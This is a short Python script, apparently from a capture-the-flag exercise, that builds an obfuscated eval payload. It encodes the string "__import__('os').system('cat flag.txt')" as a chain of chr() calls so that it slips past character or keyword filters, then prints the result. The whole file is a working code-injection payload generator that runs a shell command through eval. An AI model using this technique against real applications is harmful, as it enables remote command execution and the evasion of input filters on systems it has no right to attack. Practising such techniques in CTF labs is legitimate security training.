a = "__import__('os').system('cat flag.txt')"
exp = ""
for i in a:
    exp += f"chr({ord(i)})+"
print(f"eval({exp[:-1]})")